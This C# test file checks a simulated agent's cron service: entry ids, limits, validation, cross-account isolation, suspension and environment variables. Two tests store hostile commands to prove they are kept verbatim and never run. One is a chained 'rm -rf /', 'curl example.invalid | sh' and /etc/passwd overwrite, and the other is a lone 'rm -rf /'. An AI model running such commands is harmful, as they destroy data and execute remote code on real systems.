using Maran.Agent.Client.Services.CronService;
using Maran.Agent.Simulated.Errors;
using Maran.Agent.Simulated.Limits;
using Maran.Agent.Simulated.Services.CronService;
using Maran.Agent.Simulated.State;
using Maran.Agent.Simulated.Tests.TestSupport;

namespace Maran.Agent.Simulated.Tests.Services.CronService;

/// <summary>The simulated agent's cron operations answer like the real agent's and never interpret a command.</summary>
public sealed class SimulatedAgentCronClientTests
{
    /// <summary>A schedule that runs every five minutes.</summary>
    private static readonly AgentCronSchedule EveryFiveMinutes = new("*/5", "*", "*", "*", "*");

    /// <summary>A schedule that runs at midnight.</summary>
    private static readonly AgentCronSchedule Midnight = new("0", "0", "*", "*", "*");

    /// <summary>Creating an entry returns a uuid-shaped id, and the listing shows the entry enabled.</summary>
    [Fact]
    public async Task Creating_an_entry_returns_a_uuid_shaped_id_and_lists_it_enabled()
    {
        var (client, _) = NewClient();

        var created = await client.CreateEntryAsync(
            "alice",
            EveryFiveMinutes,
            "php artisan queue:work",
            null,
            CancellationToken.None);
        var listed = await client.ListEntriesAsync("alice", CancellationToken.None);

        Assert.True(Guid.TryParseExact(created.Value, "D", out var parsed));
        Assert.Equal(parsed.ToString("D"), created.Value);
        var entry = Assert.Single(listed.Value);
        Assert.Equal(new AgentCronEntry(created.Value, EveryFiveMinutes, "php artisan queue:work", true), entry);
    }

    /// <summary>The same actions in the same order produce the same ids, and two entries never share one.</summary>
    [Fact]
    public async Task The_same_actions_in_the_same_order_produce_the_same_ids_and_two_entries_never_share_one()
    {
        var (firstClient, _) = NewClient();
        var (secondClient, _) = NewClient();

        var a1 = await firstClient.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        var b1 = await firstClient.CreateEntryAsync("alice", EveryFiveMinutes, "b", null, CancellationToken.None);
        var a2 = await secondClient.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);

        Assert.Equal(a1.Value, a2.Value);
        Assert.NotEqual(a1.Value, b1.Value);
    }

    /// <summary>An id is not handed out again after its entry is deleted.</summary>
    [Fact]
    public async Task An_id_is_not_handed_out_again_after_its_entry_is_deleted()
    {
        var (client, _) = NewClient();
        var first = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        await client.DeleteEntryAsync("alice", first.Value, CancellationToken.None);

        var second = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);

        Assert.NotEqual(first.Value, second.Value);
    }

    /// <summary>An entry with the same schedule and command as an installed one answers already exists.</summary>
    [Fact]
    public async Task An_entry_with_the_same_schedule_and_command_answers_already_exists()
    {
        var (client, _) = NewClient();
        await client.CreateEntryAsync("alice", EveryFiveMinutes, "backup", null, CancellationToken.None);

        var again = await client.CreateEntryAsync("alice", EveryFiveMinutes, "backup", null, CancellationToken.None);
        var otherSchedule = await client.CreateEntryAsync("alice", Midnight, "backup", null, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.AlreadyExistsCode, again.Error!.Code);
        Assert.True(otherSchedule.IsSuccess);
    }

    /// <summary>A stated allowance that is already met refuses the entry, and zero is a real allowance.</summary>
    [Fact]
    public async Task A_stated_allowance_that_is_already_met_refuses_the_entry_and_zero_is_a_real_allowance()
    {
        var (client, _) = NewClient();

        var none = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", 0u, CancellationToken.None);
        var first = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", 1u, CancellationToken.None);
        var second = await client.CreateEntryAsync("alice", EveryFiveMinutes, "b", 1u, CancellationToken.None);
        var unstated = await client.CreateEntryAsync("alice", EveryFiveMinutes, "c", null, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.LimitReachedCode, none.Error!.Code);
        Assert.True(first.IsSuccess);
        Assert.Equal(SimulatedAgentErrors.LimitReachedCode, second.Error!.Code);
        Assert.True(unstated.IsSuccess);
    }

    /// <summary>
    /// One account holds at most the built-in ceiling whatever its plan says, and another account is unaffected.
    /// </summary>
    [Fact]
    public async Task One_account_holds_at_most_the_built_in_ceiling_and_another_account_is_unaffected()
    {
        var (client, _) = NewClient();
        for (var index = 0; index < SimulatedAgentLimits.Default.MaxCronEntriesPerAccount; index++)
        {
            var created = await client.CreateEntryAsync(
                "alice",
                EveryFiveMinutes,
                $"job{index}",
                null,
                CancellationToken.None);
            Assert.True(created.IsSuccess);
        }

        var over = await client.CreateEntryAsync(
            "alice",
            EveryFiveMinutes,
            "one-too-many",
            null,
            CancellationToken.None);
        var other = await client.CreateEntryAsync("bob", EveryFiveMinutes, "job", null, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.LimitReachedCode, over.Error!.Code);
        Assert.True(other.IsSuccess);
    }

    /// <summary>The server as a whole holds at most the built-in ceiling.</summary>
    [Fact]
    public async Task The_server_as_a_whole_holds_at_most_the_built_in_ceiling()
    {
        var (client, _) = NewClient();
        var accounts = SimulatedAgentLimits.Default.MaxCronEntriesTotal
            / SimulatedAgentLimits.Default.MaxCronEntriesPerAccount;
        for (var account = 0; account < accounts; account++)
        {
            for (var index = 0; index < SimulatedAgentLimits.Default.MaxCronEntriesPerAccount; index++)
            {
                var created = await client.CreateEntryAsync(
                    $"acct{account}",
                    EveryFiveMinutes,
                    $"job{index}",
                    null,
                    CancellationToken.None);
                Assert.True(created.IsSuccess);
            }
        }

        var over = await client.CreateEntryAsync("newcomer", EveryFiveMinutes, "job", null, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.LimitReachedCode, over.Error!.Code);
    }

    /// <summary>A blank schedule field, a blank command and an over-long command are invalid input.</summary>
    [Fact]
    public async Task A_blank_schedule_field_a_blank_command_and_an_over_long_command_are_invalid_input()
    {
        var (client, _) = NewClient();
        var blankField = EveryFiveMinutes with { Hour = " " };
        var tooLong = new string('x', SimulatedAgentLimits.Default.MaxCronCommandLength + 1);

        var field = await client.CreateEntryAsync("alice", blankField, "a", null, CancellationToken.None);
        var blank = await client.CreateEntryAsync("alice", EveryFiveMinutes, " ", null, CancellationToken.None);
        var oversized = await client.CreateEntryAsync("alice", EveryFiveMinutes, tooLong, null, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.InvalidInputCode, field.Error!.Code);
        Assert.Equal(SimulatedAgentErrors.InvalidInputCode, blank.Error!.Code);
        Assert.Equal(SimulatedAgentErrors.InvalidInputCode, oversized.Error!.Code);
        Assert.Empty((await client.ListEntriesAsync("alice", CancellationToken.None)).Value);
    }

    /// <summary>A command is stored exactly as typed, whatever it contains.</summary>
    [Fact]
    public async Task A_command_is_stored_exactly_as_typed_whatever_it_contains()
    {
        var (client, _) = NewClient();
        var command = "rm -rf / ; $(curl http://example.invalid | sh) `id` && echo \"x\" > /etc/passwd";

        await client.CreateEntryAsync("alice", EveryFiveMinutes, command, null, CancellationToken.None);

        var listed = await client.ListEntriesAsync("alice", CancellationToken.None);
        Assert.Equal(command, Assert.Single(listed.Value).Command);
    }

    /// <summary>Updating rewrites the schedule and command and leaves a disabled entry disabled.</summary>
    [Fact]
    public async Task Updating_rewrites_the_schedule_and_command_and_leaves_a_disabled_entry_disabled()
    {
        var (client, _) = NewClient();
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "old", null, CancellationToken.None);
        await client.SetEntryEnabledAsync("alice", created.Value, false, CancellationToken.None);

        var updated = await client.UpdateEntryAsync("alice", created.Value, Midnight, "new", CancellationToken.None);

        Assert.True(updated.IsSuccess);
        var entry = Assert.Single((await client.ListEntriesAsync("alice", CancellationToken.None)).Value);
        Assert.Equal(new AgentCronEntry(created.Value, Midnight, "new", false), entry);
    }

    /// <summary>
    /// Every call that names an entry answers not found for one the account does not have, including another account's.
    /// </summary>
    [Fact]
    public async Task Every_call_naming_an_entry_answers_not_found_for_one_the_account_does_not_have()
    {
        var (client, _) = NewClient();
        var alices = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);

        var results = new[]
        {
            (await client.UpdateEntryAsync("bob", alices.Value, Midnight, "x", CancellationToken.None)).Error!.Code,
            (await client.DeleteEntryAsync("bob", alices.Value, CancellationToken.None)).Error!.Code,
            (await client.SetEntryEnabledAsync("bob", alices.Value, false, CancellationToken.None)).Error!.Code,
            (await client.GetEntryOutputAsync("bob", alices.Value, CancellationToken.None)).Error!.Code,
            (await client.RunEntryAsync("bob", alices.Value, CancellationToken.None)).Error!.Code,
            (await client.DeleteEntryAsync("alice", "no-such-entry", CancellationToken.None)).Error!.Code,
        };

        Assert.All(results, code => { Assert.Equal(SimulatedAgentErrors.NotFoundCode, code); });
        Assert.Single((await client.ListEntriesAsync("alice", CancellationToken.None)).Value);
    }

    /// <summary>Deleting an entry removes it and what its last run left.</summary>
    [Fact]
    public async Task Deleting_an_entry_removes_it_and_what_its_last_run_left()
    {
        var (client, _) = NewClient();
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        await client.RunEntryAsync("alice", created.Value, CancellationToken.None);

        var deleted = await client.DeleteEntryAsync("alice", created.Value, CancellationToken.None);

        Assert.True(deleted.IsSuccess);
        Assert.Empty((await client.ListEntriesAsync("alice", CancellationToken.None)).Value);
        Assert.Equal(
            SimulatedAgentErrors.NotFoundCode,
            (await client.GetEntryOutputAsync("alice", created.Value, CancellationToken.None)).Error!.Code);
    }

    /// <summary>An entry that never ran reports no trace of a run, which is not an empty run.</summary>
    [Fact]
    public async Task An_entry_that_never_ran_reports_no_trace_of_a_run()
    {
        var (client, _) = NewClient();
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);

        var output = await client.GetEntryOutputAsync("alice", created.Value, CancellationToken.None);

        Assert.True(output.IsSuccess);
        Assert.Null(output.Value);
    }

    /// <summary>
    /// A run by hand exits cleanly with no output, is recorded as the last run at the clock's time, and starts nothing.
    /// </summary>
    [Fact]
    public async Task A_run_by_hand_exits_cleanly_with_no_output_and_is_recorded_as_the_last_run()
    {
        var (client, _) = NewClient();
        var created = await client.CreateEntryAsync(
            "alice",
            EveryFiveMinutes,
            "rm -rf /",
            null,
            CancellationToken.None);

        var run = await client.RunEntryAsync("alice", created.Value, CancellationToken.None);
        var output = await client.GetEntryOutputAsync("alice", created.Value, CancellationToken.None);

        Assert.Equal(new AgentCronRunExited(0), run.Value.End);
        Assert.Equal(string.Empty, run.Value.Stdout);
        Assert.Equal(string.Empty, run.Value.Stderr);
        Assert.InRange(run.Value.DurationMilliseconds, 50, 1500);
        Assert.Equal(
            new AgentCronRunOutput(string.Empty, 0, new FixedClock().UtcNow.ToUnixTimeSeconds()),
            output.Value);
    }

    /// <summary>
    /// The fabricated duration depends only on the command, so the same command takes the same time on every server.
    /// </summary>
    [Fact]
    public async Task The_fabricated_duration_depends_only_on_the_command()
    {
        var (firstClient, _) = NewClient();
        var (secondClient, _) = NewClient();
        var first = await firstClient.CreateEntryAsync(
            "alice",
            EveryFiveMinutes,
            "backup",
            null,
            CancellationToken.None);
        var second = await secondClient.CreateEntryAsync("bob", Midnight, "backup", null, CancellationToken.None);

        var firstRun = await firstClient.RunEntryAsync("alice", first.Value, CancellationToken.None);
        var secondRun = await secondClient.RunEntryAsync("bob", second.Value, CancellationToken.None);

        Assert.Equal(firstRun.Value.DurationMilliseconds, secondRun.Value.DurationMilliseconds);
    }

    /// <summary>A suspended account refuses a run by hand and nothing is recorded; resuming allows it again.</summary>
    [Fact]
    public async Task A_suspended_account_refuses_a_run_by_hand_and_resuming_allows_it_again()
    {
        var (client, _) = NewClient();
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);

        await client.SetAccountSuspendedAsync("alice", true, CancellationToken.None);
        var refused = await client.RunEntryAsync("alice", created.Value, CancellationToken.None);
        var traceWhileSuspended = await client.GetEntryOutputAsync("alice", created.Value, CancellationToken.None);
        await client.SetAccountSuspendedAsync("alice", false, CancellationToken.None);
        var allowed = await client.RunEntryAsync("alice", created.Value, CancellationToken.None);

        Assert.Equal(SimulatedAgentErrors.AccountSuspendedCode, refused.Error!.Code);
        Assert.Null(traceWhileSuspended.Value);
        Assert.True(allowed.IsSuccess);
    }

    /// <summary>
    /// Suspending leaves each entry's own enablement alone, so resuming does not switch back on what the customer
    /// turned off.
    /// </summary>
    [Fact]
    public async Task Suspending_leaves_each_entrys_own_enablement_alone()
    {
        var (client, _) = NewClient();
        var on = await client.CreateEntryAsync("alice", EveryFiveMinutes, "on", null, CancellationToken.None);
        var off = await client.CreateEntryAsync("alice", EveryFiveMinutes, "off", null, CancellationToken.None);
        await client.SetEntryEnabledAsync("alice", off.Value, false, CancellationToken.None);

        await client.SetAccountSuspendedAsync("alice", true, CancellationToken.None);
        await client.SetAccountSuspendedAsync("alice", false, CancellationToken.None);

        var entries = (await client.ListEntriesAsync("alice", CancellationToken.None)).Value;
        Assert.True(entries.Single(entry => { return entry.EntryId == on.Value; }).Enabled);
        Assert.False(entries.Single(entry => { return entry.EntryId == off.Value; }).Enabled);
    }

    /// <summary>
    /// Suspending an account with no crontab succeeds and does not suspend entries created afterwards.
    /// </summary>
    [Fact]
    public async Task Suspending_an_account_with_no_crontab_succeeds_and_changes_nothing()
    {
        var (client, _) = NewClient();

        var suspended = await client.SetAccountSuspendedAsync("alice", true, CancellationToken.None);
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        var run = await client.RunEntryAsync("alice", created.Value, CancellationToken.None);

        Assert.True(suspended.IsSuccess);
        Assert.True(run.IsSuccess);
    }

    /// <summary>Suspension of one account does not touch another's entries.</summary>
    [Fact]
    public async Task Suspension_of_one_account_does_not_touch_another_accounts_entries()
    {
        var (client, _) = NewClient();
        await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        var bobs = await client.CreateEntryAsync("bob", EveryFiveMinutes, "b", null, CancellationToken.None);

        await client.SetAccountSuspendedAsync("alice", true, CancellationToken.None);
        var run = await client.RunEntryAsync("bob", bobs.Value, CancellationToken.None);

        Assert.True(run.IsSuccess);
    }

    /// <summary>A last run seeded into the state is the one the client reads back.</summary>
    [Fact]
    public async Task A_last_run_seeded_into_the_state_is_the_one_the_client_reads_back()
    {
        var (client, ledger) = NewClient();
        var created = await client.CreateEntryAsync("alice", EveryFiveMinutes, "a", null, CancellationToken.None);
        var seeded = new AgentCronRunOutput("done", 1, 1_700_000_000);

        ledger.CronTables.RecordRun("alice", created.Value, seeded);

        Assert.Equal(seeded, (await client.GetEntryOutputAsync("alice", created.Value, CancellationToken.None)).Value);
    }

    /// <summary>Environment assignments are replaced whole, and an empty list clears every one.</summary>
    [Fact]
    public async Task Environment_assignments_are_replaced_whole_and_an_empty_list_clears_every_one()
    {
        var (client, _) = NewClient();
        await client.SetEnvironmentAsync(
            "alice",
            [new AgentCronEnvVar("MAILTO", "a@example.com"), new AgentCronEnvVar("TZ", "UTC")],
            CancellationToken.None);

        await client.SetEnvironmentAsync("alice", [new AgentCronEnvVar("TZ", "Asia/Yerevan")], CancellationToken.None);
        var replaced = await client.GetEnvironmentAsync("alice", CancellationToken.None);
        await client.SetEnvironmentAsync("alice", [], CancellationToken.None);
        var cleared = await client.GetEnvironmentAsync("alice", CancellationToken.None);

        Assert.Equal(new[] { new AgentCronEnvVar("TZ", "Asia/Yerevan") }, replaced.Value);
        Assert.Empty(cleared.Value);
    }

    /// <summary>A refused environment set is refused whole: the assignments the crontab held stay.</summary>
    [Fact]
    public async Task A_refused_environment_set_is_refused_whole_and_the_held_assignments_stay()
    {
        var (client, _) = NewClient();
        var held = new AgentCronEnvVar("TZ", "UTC");
        await client.SetEnvironmentAsync("alice", [held], CancellationToken.None);
        var tooMany = Enumerable.Range(0, SimulatedAgentLimits.Default.MaxCronEnvironmentVariables + 1)
            .Select(index => { return new AgentCronEnvVar($"V{index}", "x"); })
            .ToList();
        var longName = new AgentCronEnvVar(
            new string('N', SimulatedAgentLimits.Default.MaxCronEnvironmentNameLength + 1),
            "x");
        var longValue = new AgentCronEnvVar(
            "V",
            new string('v', SimulatedAgentLimits.Default.MaxCronEnvironmentValueLength + 1));
        var blankName = new AgentCronEnvVar(" ", "x");

        var results = new[]
        {
            await client.SetEnvironmentAsync("alice", tooMany, CancellationToken.None),
            await client.SetEnvironmentAsync("alice", [held, longName], CancellationToken.None),
            await client.SetEnvironmentAsync("alice", [held, longValue], CancellationToken.None),
            await client.SetEnvironmentAsync("alice", [held, blankName], CancellationToken.None),
        };

        Assert.All(results, result => { Assert.Equal(SimulatedAgentErrors.InvalidInputCode, result.Error!.Code); });
        Assert.Equal(new[] { held }, (await client.GetEnvironmentAsync("alice", CancellationToken.None)).Value);
    }

    /// <summary>An account with no crontab has an empty entry list and an empty environment.</summary>
    [Fact]
    public async Task An_account_with_no_crontab_has_an_empty_entry_list_and_an_empty_environment()
    {
        var (client, _) = NewClient();

        Assert.Empty((await client.ListEntriesAsync("nobody", CancellationToken.None)).Value);
        Assert.Empty((await client.GetEnvironmentAsync("nobody", CancellationToken.None)).Value);
    }

    /// <summary>Builds a client over a fresh ledger and a fixed clock, and returns both.</summary>
    /// <returns>The client and the ledger it reads, so a test can seed and inspect the state.</returns>
    private static (SimulatedAgentCronClient Client, SimulatedAgentLedger Ledger) NewClient()
    {
        var ledger = new SimulatedAgentLedger(SimulatedAgentLimits.Default);

        return (new SimulatedAgentCronClient(ledger, new FixedClock()), ledger);
    }
}
